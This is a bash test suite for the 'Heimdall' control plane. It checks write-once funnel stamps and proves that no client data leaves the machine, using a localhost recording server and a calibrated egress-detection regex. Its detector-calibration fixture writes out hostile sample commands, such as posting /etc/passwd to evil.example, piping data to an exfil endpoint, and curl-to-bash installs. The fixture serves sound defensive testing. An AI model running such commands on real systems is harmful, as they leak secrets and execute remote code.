#!/usr/bin/env bash
# cp-funnel.test.sh — SERVER-SIDE launch-funnel stamps (derived facts, ZERO new client egress).
#
# THE GOVERNING CONSTRAINT THIS SUITE GATES. IDENTITY.md:32-38 is a signed, dated boundary: the
# signed heartbeat is "the ONLY thing sent home; no analytics, no tracking, no third parties",
# and DATA.md:15 publicly commits that telemetry is "Not in this release. Written to a LOCAL
# spool only." A NEW payload sent from the client BREAKS that claim. A fact DERIVED server-side
# from data the heartbeat ALREADY lawfully delivered does not. Every stamp gated here is in the
# second category, and section 4 is the falsifiable proof of it.
#
# WHAT THIS GATES (cp_funnel + its two call sites, cp_enroll and cp_presence):
#
#   1. TEAM-2+ (the K-factor numerator) — the 1 -> 2 member edge stamps
#      funnel/team_grew/<team_id_hash>.json {first_second_member_at} EXACTLY ONCE. A 2 -> 3
#      enroll NEVER overwrites it (lose the write-once and you lose the cohort date). The doc
#      is keyed by the ONE-WAY pmr.team_id_hash projection, NEVER the raw team_id.
#   2. ENROLL (the denominator) — (a) a read surface over the EXISTING key registry bucketed by
#      enrolled_at, and (b) an APPEND-ONLY funnel/enroll/<day>.ndjson counter written at the
#      enroll site, because cp_registry_hygiene EVICTS idle bindings and the registry-derived
#      number would silently decay to zero. Both are asserted across a real eviction.
#   3. FIRST-VERDICT (the activation event) — the first non-empty `verdict` on a heartbeat
#      stamps funnel/first_verdict/<haid_hash>.json {first_verdict_at}; a later verdict does NOT
#      overwrite it; and the stamp SURVIVES presence reaping because `funnel` is NOT a TTL-
#      eligible Firestore root (the presence record it is derived from is reaped; the stamp is
#      not). `verdict` is already named in IDENTITY.md's sanctioned heartbeat payload.
#   4. NO-EGRESS (the cardinal privacy proof) — with the control plane SEVERED, a beat + roster
#      reach a localhost recording server ZERO times, and a WHOLE-TREE scan proves no outbound
#      primitive EXISTS anywhere on the funnel surface. That scan is deliberately NOT a
#      `git diff`: a diff sees only uncommitted lines, so it would prove "none was ADDED since
#      the last commit" while advertising "none exists" — and would go blind the instant an
#      egress primitive was committed. The detector is itself calibrated against a fixture of
#      real invocations AND of mere mentions (4e), because a privacy gate that reds on a help
#      string gets muted, and a muted gate takes the red that matters with it.
#      Mirrors test/heimdall-presence-cp-optin.test.sh section 2d.
#
# Hermetic: throwaway HOME + external store dir, local StateBackend, localhost-only wire server,
# no real GCP / no network. Exit 0 = every proof holds.

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"
export LIB REPO

for f in cp_funnel cp_enroll cp_presence cp_auth cp_state cp_registry_hygiene pmr_corpus; do
  [ -f "$LIB/$f.py" ] || { echo "FATAL: $LIB/$f.py missing" >&2; exit 2; }
done

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

EXT="$(mktemp -d -t cp-funnel)"
WIRE_PID=""
cleanup() { [ -n "$WIRE_PID" ] && kill "$WIRE_PID" >/dev/null 2>&1 || true; rm -rf "$EXT"; }
trap cleanup EXIT

# ══════════════════════════════════════════════════════════════════════════════
# 1. TEAM-2+ — the 1 -> 2 edge stamps ONCE; 2 -> 3 never overwrites  [FALSIFIABLE]
# ══════════════════════════════════════════════════════════════════════════════
echo "1. team-2+: the 1->2 member edge stamps first_second_member_at exactly once"
H1="$EXT/home1"; mkdir -p "$H1"
OUT1="$(HEIMDALL_HOME="$H1" HEIMDALL_ENROLL_OPEN=1 LIB="$LIB" "$PY" - <<'PYEOF' 2>&1
import base64, json, os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_auth, cp_enroll, cp_funnel, cp_state
import pmr_corpus as pmr

SECRET = "team-secret-for-the-funnel-gate-0123456789abcdef"
TEAM = cp_auth.derive_team_id(SECRET)
HASH = pmr.team_id_hash(TEAM)
REL = cp_funnel.team_grew_rel(TEAM)
backend = cp_state.get_backend()

def pub(seed):
    return base64.b64encode(bytes([seed]) * 32).decode("ascii")

def enroll(haid, seed):
    return cp_enroll.enroll(haid, pub(seed), provided_token=None, team_secret=SECRET)

out = {"team_id": TEAM, "hash": HASH, "rel": REL}

# member 1 — the 0 -> 1 edge is NOT the K-factor event; nothing may be stamped yet.
out["r1"] = enroll("haid:m1", 1)
out["after_1"] = backend.get_record(REL)

# member 2 — THE 1 -> 2 edge. This is the stamp.
time.sleep(1.05)
out["r2"] = enroll("haid:m2", 2)
rec2 = backend.get_record(REL)
out["after_2"] = rec2

# member 3 — the 2 -> 3 edge must NEVER overwrite the cohort date.
time.sleep(1.05)
out["r3"] = enroll("haid:m3", 3)
out["after_3"] = backend.get_record(REL)
out["members"] = cp_auth.team_member_count(TEAM)

# THE RE-CROSSED EDGE (what actually isolates write-once). cp_registry_hygiene EVICTS idle
# bindings, so a team can fall BACK to one member and then cross 1 -> 2 a SECOND time. The
# members_before guard does NOT protect the stamp here -- it is satisfied again -- so only
# write-once keeps the original cohort date. Drop write-once and this overwrites.
cp_auth.remove_keys(["haid:m2", "haid:m3"], home=None)
out["members_after_evict"] = cp_auth.team_member_count(TEAM)
time.sleep(1.05)
out["r4"] = enroll("haid:m4", 4)
out["members_recrossed"] = cp_auth.team_member_count(TEAM)
out["after_recross"] = backend.get_record(REL)
print(json.dumps(out, sort_keys=True))
PYEOF
)"
R1="$?"

if [ "$R1" -eq 0 ] && printf '%s' "$OUT1" | "$PY" -c '
import json, sys
d = json.load(sys.stdin)
assert d["members"] == 3, d["members"]
assert d["after_1"] is None, "0->1 must NOT stamp"
a2, a3 = d["after_2"], d["after_3"]
assert isinstance(a2, dict) and isinstance(a2.get("first_second_member_at"), (int, float)), a2
assert a3 == a2, "2->3 OVERWROTE the cohort date"
assert d["members_after_evict"] == 1, d
assert d["members_recrossed"] == 2, d
assert d["after_recross"] == a2, "a RE-CROSSED 1->2 edge OVERWROTE the cohort date"
' >/dev/null 2>&1; then
  ok "1a 1->2 stamps first_second_member_at; 0->1 does not; 2->3 does NOT overwrite; a RE-CROSSED 1->2 (post-eviction) does NOT overwrite (write-once)"
else
  bad "1a team_grew stamp wrong (rc=$R1) -- $OUT1"
fi

# 1b the doc is keyed by the ONE-WAY hash, never the raw team_id (no join back to a team).
if printf '%s' "$OUT1" | "$PY" -c '
import json, sys
d = json.load(sys.stdin)
assert d["hash"] in d["rel"], d
assert d["team_id"] not in d["rel"], "RAW team_id leaked into the funnel key"
assert d["rel"].startswith("funnel/"), d["rel"]
' >/dev/null 2>&1; then
  ok "1b the key is funnel/team_grew/<pmr.team_id_hash> -- the RAW team_id never appears"
else
  bad "1b funnel key leaked the raw team_id -- $OUT1"
fi

# ══════════════════════════════════════════════════════════════════════════════
# 2. ENROLL — the append-only day counter SURVIVES a real cp_registry_hygiene eviction
# ══════════════════════════════════════════════════════════════════════════════
echo
echo "2. enroll denominator: append-only counter survives registry eviction"
H2="$EXT/home2"; mkdir -p "$H2"
OUT2="$(HEIMDALL_HOME="$H2" HEIMDALL_ENROLL_OPEN=1 LIB="$LIB" "$PY" - <<'PYEOF' 2>&1
import base64, json, os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_auth, cp_enroll, cp_funnel, cp_registry_hygiene
import cp_state

SECRET = "team-secret-for-the-funnel-gate-0123456789abcdef"
TEAM = cp_auth.derive_team_id(SECRET)
NOW = time.time()
DAY = cp_funnel.day_key(NOW)

def pub(seed):
    return base64.b64encode(bytes([seed]) * 32).decode("ascii")

for i in range(1, 4):
    cp_enroll.enroll("haid:e%d" % i, pub(i), provided_token=None, team_secret=SECRET)

out = {"day": DAY}
out["spool_before"] = cp_funnel.enroll_count(day=DAY)
out["registry_before"] = cp_funnel.enrolled_by_day()

# Age every binding past the idle window so the REAL hygiene job evicts them, then run it.
reg = cp_auth._load_keys(None)
for entry in reg["keys"].values():
    entry["enrolled_at"] = int(NOW - 400 * 86400)
cp_state.get_backend().put_record(cp_auth._KEYS_REL, reg)

plan = cp_registry_hygiene.evict_stale(apply=True)
out["evicted"] = sorted(plan["evicted"])
out["registry_after"] = cp_funnel.enrolled_by_day()
out["spool_after"] = cp_funnel.enroll_count(day=DAY)
out["spool_total"] = cp_funnel.enroll_count()
print(json.dumps(out, sort_keys=True))
PYEOF
)"
R2="$?"

if [ "$R2" -eq 0 ] && printf '%s' "$OUT2" | "$PY" -c '
import json, sys
d = json.load(sys.stdin)
assert d["spool_before"] == 3, d
assert d["registry_before"].get(d["day"]) == 3, d
assert len(d["evicted"]) == 3, d
assert d["registry_after"].get(d["day"], 0) == 0, "registry read surface should decay to 0"
assert d["spool_after"] == 3, "the append-only counter DECAYED with the eviction"
assert d["spool_total"] == 3, d
' >/dev/null 2>&1; then
  ok "2a 3 enrolls -> spool=3 AND registry=3; after eviction registry DECAYS to 0 but the spool still reads 3"
else
  bad "2a enroll counter did not survive eviction (rc=$R2) -- $OUT2"
fi

# ══════════════════════════════════════════════════════════════════════════════
# 3. FIRST-VERDICT — stamps once, never overwritten, survives presence reaping
# ══════════════════════════════════════════════════════════════════════════════
echo
echo "3. first-verdict: stamps on the first non-empty verdict, write-once, reap-proof"
H3="$EXT/home3"; mkdir -p "$H3"
OUT3="$(HEIMDALL_HOME="$H3" LIB="$LIB" "$PY" - <<'PYEOF' 2>&1
import json, os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_funnel, cp_presence, cp_state
import cp_state_firestore as fs

HAID = "haid:v1"
PROJ = "acme/widget"
TEAM = "0123456789abcdef0123456789abcdef"
REL = cp_funnel.first_verdict_rel(HAID)
backend = cp_state.get_backend()
out = {"rel": REL, "haid": HAID}

def beat(verdict):
    return cp_presence.record_presence(HAID, project=PROJ, team_id=TEAM, verdict=verdict)

# a beat with NO verdict is not an activation — nothing may be stamped.
beat(None)
out["after_none"] = backend.get_record(REL)
beat("")
out["after_empty"] = backend.get_record(REL)

# the FIRST non-empty verdict IS the activation.
time.sleep(1.05)
beat("building")
out["after_first"] = backend.get_record(REL)

# a LATER verdict must not move the activation instant.
time.sleep(1.05)
beat("testing")
out["after_second"] = backend.get_record(REL)

# REAPING: drop the presence record entirely (what the reaper does) — the stamp survives
# because it lives on its own durable doc, not on the reaped presence doc.
presence_rel = cp_presence._record_rel(PROJ, TEAM, HAID)
os.remove(backend.path(presence_rel))
out["presence_after_reap"] = backend.get_record(presence_rel)
out["after_reap"] = backend.get_record(REL)

# the DURABILITY proof under firestore: `funnel` is not a TTL-eligible root, so no ttl_at is
# ever attached to a funnel doc (reaping a presence doc can never take the stamp with it).
# NB: no apostrophes in this heredoc -- bash 3.2 (the macOS default) mis-parses a bare
# single quote inside a heredoc nested in a $( ) command substitution.
out["funnel_ttl"] = fs._ttl_at_for(REL)
out["ttl_roots"] = sorted(fs._TTL_ELIGIBLE_ROOTS)
print(json.dumps(out, sort_keys=True, default=str))
PYEOF
)"
R3="$?"

if [ "$R3" -eq 0 ] && printf '%s' "$OUT3" | "$PY" -c '
import json, sys
d = json.load(sys.stdin)
assert d["after_none"] is None, "a verdict-less beat must NOT stamp"
assert d["after_empty"] is None, "an EMPTY verdict must NOT stamp"
f = d["after_first"]
assert isinstance(f, dict) and isinstance(f.get("first_verdict_at"), (int, float)), f
assert d["after_second"] == f, "a LATER verdict OVERWROTE first_verdict_at"
' >/dev/null 2>&1; then
  ok "3a first non-empty verdict stamps first_verdict_at; verdict-less/empty beats do not; a later verdict does NOT overwrite"
else
  bad "3a first_verdict_at stamping wrong (rc=$R3) -- $OUT3"
fi

if printf '%s' "$OUT3" | "$PY" -c '
import json, sys
d = json.load(sys.stdin)
assert d["presence_after_reap"] is None, "the presence record was not actually reaped"
assert d["after_reap"] == d["after_first"], "the stamp EVAPORATED with the presence record"
assert d["funnel_ttl"] is None, "a funnel doc carries ttl_at -- firestore will reap the stamp"
assert "funnel" not in d["ttl_roots"], d["ttl_roots"]
' >/dev/null 2>&1; then
  ok "3b the stamp SURVIVES presence reaping -- funnel is not a TTL-eligible root, so no ttl_at is ever attached"
else
  bad "3b the stamp did not survive reaping -- $OUT3"
fi

# ══════════════════════════════════════════════════════════════════════════════
# 4. NO-EGRESS — the cardinal privacy proof (IDENTITY.md:32-38 / DATA.md:15)
# ══════════════════════════════════════════════════════════════════════════════
echo
echo "4. NO-EGRESS: severed => zero requests; no new client emit anywhere in the change"
REC="$EXT/rec"; mkdir -p "$REC"
cat >"$EXT/recsrv.py" <<'PYEOF'
import json, os
from http.server import BaseHTTPRequestHandler, HTTPServer
REC = os.environ["REC_DIR"]
def rec(line):
    with open(os.path.join(REC, "requests.log"), "a") as fh:
        fh.write(line + "\n")
class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        return
    def _body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n else b""
    def _send(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        self._body(); rec("POST " + self.path.split("?")[0])
        return self._send(200, {"ok": True})
    def do_GET(self):
        rec("GET " + self.path.split("?")[0])
        return self._send(200, {"roster": []})
srv = HTTPServer(("127.0.0.1", 0), H)
open(os.path.join(REC, "port"), "w").write(str(srv.server_address[1]))
srv.serve_forever()
PYEOF
REC_DIR="$REC" "$PY" "$EXT/recsrv.py" &
WIRE_PID=$!
for _ in $(seq 1 40); do [ -s "$REC/port" ] && break; "$PY" -c "import time;time.sleep(0.1)"; done
PORT="$(cat "$REC/port" 2>/dev/null || true)"

H4="$EXT/home4"; R4="$EXT/repo4"; mkdir -p "$H4" "$R4"
if [ -z "$PORT" ]; then
  bad "4a recording server never bound a port -- cannot prove no-egress"
else
  pres4() { env -u HEIMDALL_CP_URL -u BASE_URL HOME="$H4" HEIMDALL_PRESENCE_DIR="$R4/.heimdall" \
            HEIMDALL_DEFAULT_CP_URL="http://127.0.0.1:$PORT" HMD_ENROLL_THROTTLE=0 \
            HMD_HAID="haid:t4" HMD_PROJECT="acme/widget" "$REPO/bin/heimdall-presence" "$@"; }
  # SEVER the control plane (the opt-out nulls the CP URL) THEN clear the log, so only
  # post-sever traffic is observed. Any funnel work routed through its own endpoint would
  # escape this opt-out and show up here.
  pres4 sever >/dev/null 2>&1
  : > "$REC/requests.log"
  B4=0; pres4 beat --handle t4 --verdict building --file src/app.py >/dev/null 2>&1 || B4=$?
  O4=0; pres4 roster >/dev/null 2>&1 || O4=$?
  if [ ! -s "$REC/requests.log" ] && [ "$B4" -eq 0 ] && [ "$O4" -eq 0 ]; then
    ok "4a SEVERED: a beat + a roster produce ZERO requests -- the funnel adds no egress that escapes the opt-out"
  else
    bad "4a funnel LEAKED past the sever (beat=$B4 roster=$O4) -- log: $(cat "$REC/requests.log" 2>/dev/null)"
  fi
fi
kill "$WIRE_PID" >/dev/null 2>&1 || true; wait "$WIRE_PID" 2>/dev/null || true; WIRE_PID=""

# 4b SOURCE DISCIPLINE: an OUTBOUND primitive is the thing that would break the claim. A stamp
#    is a store write on a fact the heartbeat already delivered, never a call home. The check
#    below makes a STANDING claim, and its two halves are each deliberate:
#
#    (i) SCOPE -- this is a WHOLE-TREE scan of every file on the funnel surface, read at its
#        CURRENT content. It is NOT `git diff HEAD`. A diff only ever sees UNCOMMITTED lines, so
#        the moment an egress primitive was committed a diff-based gate went blind to it and
#        passed: it proved "no egress was ADDED since the last commit" while advertising "no
#        egress exists". Those are different claims and only the second one backs IDENTITY.md.
#        This asserts the second: no outbound primitive EXISTS on the surface, commit or no
#        commit. (4c below is the deliberately diff-shaped check, and says so.)
#
#    (ii) PRECISION -- the pattern is scoped to primitives that OPEN a connection. urllib.parse
#        (an INBOUND query-string parser cp_presence already used) is not one and must not be
#        matched. `curl` is matched ONLY IN COMMAND POSITION, because that -- not the presence
#        of the word -- is what makes it an invocation. A shell runs `curl` only where a command
#        word may begin: at the start of a line, or after a control operator ( ; & | ( ) { } `
#        $( ), optionally through modifier words (sudo/env/exec/if/!/...). Inside `echo "...
#        curl ... "` or after a `#`, the token is an ARGUMENT or a comment -- inert text the
#        shell never executes -- so it is not egress and must not red the gate. This matters:
#        a bare \bcurl\b fired on the reinstall help line printed by half of bin/, and a privacy
#        gate that cries wolf on documentation gets muted, taking the real red with it. The
#        narrowing gives up NOTHING: `curl ... | bash`, $(curl ...), `curl`, sudo curl, and
#        piped-into curl all remain caught, and 4e proves that on a fixture of both shapes.
EGRESS_PY_RX='urllib\.request|urlopen|http\.client|httplib|requests\.(get|post|put|request)|socket\.(socket|create_connection)|subprocess.*curl'
EGRESS_CURL_RX='(^|[;&|(){}`]|\$\()[[:space:]]*((if|then|else|elif|do|while|until|!|sudo|env|exec|command|nohup|time|xargs)[[:space:]]+)*curl([[:space:]]|$)'
EGRESS_RX="$EGRESS_PY_RX|$EGRESS_CURL_RX"

#    (iii) COMMENT DISCIPLINE -- the missing half of (ii). (ii) above already states the rule:
#        "after a `#`, the token is ... a comment -- inert text the shell never executes -- so
#        it is not egress and must not red the gate." The regex alone did NOT implement that
#        rule; it only LOOKED like it did, because a prose comment rarely happens to put a
#        control operator immediately before the word. install.sh:13 does exactly that --
#              #     `curl | bash` or in CI. A TTY operator who wants to set it is offered it;
#        -- where the MARKDOWN BACKTICK quoting the term satisfies the `[;&|(){}\`]` class, so
#        the detector read a documentation sentence as a command substitution and red the
#        privacy gate on a file that had gained no egress whatsoever. That is the cry-wolf
#        failure (ii) warns about, and a gate that cries wolf gets muted, taking the real red
#        with it.
#
#        So FULL-LINE comments are BLANKED before the scan. Blanked, not deleted, so grep -n
#        still reports the file's true line numbers in a leak report.
#
#        Deliberately FULL-LINE ONLY (`^[[:space:]]*#`), never a trailing `#`. A line whose
#        first non-blank character is `#` cannot execute anything in either shell or python.
#        Stripping from a MID-LINE `#` would be strictly more dangerous than the bug it fixes:
#        it would let `curl https://evil.example/x  # looks harmless` through, and only ever
#        REMOVES text from the detector's view -- the one direction in which a mistake makes
#        this gate weaker. 4e pins both halves with fixtures.
egress_scan() {  # $1=file -> "LINENO:text" per hit, empty when clean
  sed 's/^[[:space:]]*#.*$//' "$1" 2>/dev/null | grep -nE "$EGRESS_RX" 2>/dev/null || true
}

# THE FUNNEL SURFACE. A file is listed because a call home FROM IT would break IDENTITY.md:32-38
# -- the server modules this suite gates, plus the client-side funnel/telemetry path they could
# be wired into. Listed explicitly rather than globbed so a rename cannot silently shrink the
# surface (a missing entry is a FAILURE below, never a skip).
FUNNEL_SURFACE="bin/lib/cp_funnel.py
bin/lib/cp_enroll.py
bin/lib/cp_presence.py
bin/lib/funnel.py
bin/lib/cp_corpus.py
bin/heimdall-presence
install.sh"

# ALLOWLIST -- the ONLY surface file permitted an outbound primitive, with the reason it is
# lawful. Kept to one entry on purpose: an allowlist that names every file is a rubber stamp.
#   bin/heimdall-presence -- IS the signed-heartbeat sender. IDENTITY.md:32-38 sanctions exactly
#     this ONE call home, so a rule forbidding it would forbid the product. It is EXCUSED HERE
#     BUT NOT UNGATED: 4a proves it emits nothing once severed, and the whole of
#     test/heimdall-presence-cp-optin.test.sh gates what it may send.
EGRESS_ALLOWED="bin/heimdall-presence"

TREE_LEAK=""
SURFACE_MISSING=""
for rel in $FUNNEL_SURFACE; do
  if [ ! -f "$REPO/$rel" ]; then SURFACE_MISSING="$SURFACE_MISSING $rel"; continue; fi
  case " $EGRESS_ALLOWED " in *" $rel "*) continue ;; esac
  HIT="$(egress_scan "$REPO/$rel")"
  [ -n "$HIT" ] && TREE_LEAK="$TREE_LEAK
$rel:$HIT"
done

if [ -z "$TREE_LEAK" ] && [ -z "$SURFACE_MISSING" ]; then
  ok "4b TREE scan (not a diff): ZERO outbound primitives EXIST anywhere on the funnel surface -- committed or not -- with bin/heimdall-presence the one documented, separately-gated exception"
elif [ -n "$SURFACE_MISSING" ]; then
  bad "4b a funnel-surface file is MISSING, so the scan silently covered less than it claims:$SURFACE_MISSING"
else
  bad "4b an outbound primitive EXISTS on the funnel surface:$TREE_LEAK"
fi

# 4c THE CLIENT IS UNTOUCHED: no client-side emitter was added. The client egress surface
#    (bin/heimdall-presence, install.sh, bin/lib/funnel.py) must carry ZERO diff.
DIRTY="$(cd "$REPO" && git diff --name-only HEAD -- bin/heimdall-presence install.sh bin/lib/funnel.py bin/lib/cp_corpus.py 2>/dev/null)"
if [ -z "$DIRTY" ]; then
  ok "4c the client egress surface is UNCHANGED VS HEAD -- this one IS a working-tree diff and claims only that (4b is the standing tree scan that survives a commit)"
else
  bad "4c a client egress file was modified:
$DIRTY"
fi

# 4d funnel.py keeps its NO-TRANSPORT design -- it was never given a way home.
if ! grep -qE 'urllib|http\.client|requests\.|cp_url|CP_URL' "$LIB/funnel.py" 2>/dev/null; then
  ok "4d bin/lib/funnel.py still has NO transport (it was not wired up -- the claim-breaking path)"
else
  bad "4d bin/lib/funnel.py gained a transport -- that BREAKS the IDENTITY.md claim"
fi

# 4e DETECTOR CALIBRATION. Narrowing the pattern is only safe if the narrowing is itself
#    falsifiable, so 4b's detector is run against a fixture of BOTH shapes. Every MENTION must
#    stay silent and every real INVOCATION must be caught. This is the assertion that stops a
#    future "tidy-up" of the regex from quietly switching the privacy gate off: a gate that has
#    stopped detecting still prints PASS, which is the failure mode that matters most here.
cat >"$EXT/mentions.txt" <<'MENTIONEOF'
  echo "  Reinstall: curl -fsSL https://runheimdall.dev/install | bash" >&2
    printf "  ${D}Reinstall anytime: curl -fsSL https://runheimdall.dev/install | bash${R}\n\n"
# curl|bash installer with this team control-plane URL + TEAM SECRET inlined:
#   curl -fsSL https://runheimdall.dev/install | bash
  elif command -v curl >/dev/null 2>&1; then
- Acceptance criteria must be runnable (grep, curl, test commands)
CURL="${HEIMDALL_LV_CURL:-curl}"
  disp="curl -sS --max-time $MAXTIME"
    from urllib.parse import parse_qs
#     `curl | bash` or in CI. A TTY operator who wants to set it is offered it;
#   Install with `curl -fsSL https://runheimdall.dev/install | bash` -- documented, never run.
MENTIONEOF
cat >"$EXT/invocations.txt" <<'INVOKEEOF'
  curl -fsSL https://evil.example/install | bash
    curl -fsSL --max-time 15 "$sig_url" -o "$sig" 2>/dev/null || true
    if ! curl -fsSL --max-time 30 "$url" -o "$artifact" 2>/dev/null; then
  code="$(curl -sS -o /dev/null -w '%{http_code}' "$url")"
weekly=$(curl -s "https://api.npmjs.org/downloads/point/last-week/$pkg")
  exec bash -c 'cd "$HOME" && curl -fsSL https://example.com/install.sh | bash'
  sudo curl -X POST https://evil.example/collect -d @/etc/passwd
  cat f | curl -X POST --data-binary @- https://evil.example/exfil
  ( curl -sk https://evil.example/ping )
  beacon=`curl -s https://evil.example/beacon`
    urllib.request.urlopen(req, timeout=5)
    requests.post("https://evil.example/telemetry", json=payload)
    socket.create_connection(("evil.example", 443))
    subprocess.run(["curl", "-X", "POST", "https://evil.example/x"])
  curl -fsSL https://evil.example/x   # a TRAILING comment must not hide the live command
INVOKEEOF

N_MENTION="$(grep -c . "$EXT/mentions.txt" 2>/dev/null || echo 0)"
N_INVOKE="$(grep -c . "$EXT/invocations.txt" 2>/dev/null || echo 0)"
# BOTH halves run through egress_scan -- the SAME function 4b scans the real surface with,
# comment-blanking included. Calibrating the bare regex instead would have certified a
# detector that is not the one doing the work, which is how install.sh:13 got read as a
# command substitution while this check still printed PASS.
CAL_FP="$(egress_scan "$EXT/mentions.txt")"
CAL_CAUGHT="$(egress_scan "$EXT/invocations.txt" | cut -d: -f1)"
CAL_MISS=""
cln=0
while IFS= read -r cline; do
  cln=$((cln + 1))
  [ -z "$cline" ] && continue
  printf '%s\n' "$CAL_CAUGHT" | grep -qx "$cln" || CAL_MISS="$CAL_MISS
$cline"
done <"$EXT/invocations.txt"

if [ -z "$CAL_FP" ] && [ -z "$CAL_MISS" ] && [ "$N_MENTION" -ge 11 ] && [ "$N_INVOKE" -ge 15 ]; then
  ok "4e detector calibrated: $N_MENTION mention shapes (help strings, printf, comments, BACKTICK-QUOTED curl inside a comment, a command -v probe, urllib.parse) ALL stay silent; $N_INVOKE invocation shapes (curl|bash, \$(curl), backtick, sudo, piped-into, exec bash -c, a live curl carrying a TRAILING comment, urlopen/requests/socket/subprocess) ALL trip it"
elif [ -n "$CAL_FP" ]; then
  bad "4e the detector reds on a MENTION -- a noisy gate gets muted:
$CAL_FP"
elif [ -n "$CAL_MISS" ]; then
  bad "4e the detector MISSED a real outbound invocation -- the narrowing opened a hole:$CAL_MISS"
else
  bad "4e the calibration fixture did not load (mentions=$N_MENTION invocations=$N_INVOKE) -- the check proved nothing"
fi

echo
echo "============================================================"
printf "cp-funnel: %d passed, %d failed\n" "$PASS" "$FAIL"
echo "============================================================"
[ "$FAIL" -eq 0 ] || exit 1
exit 0
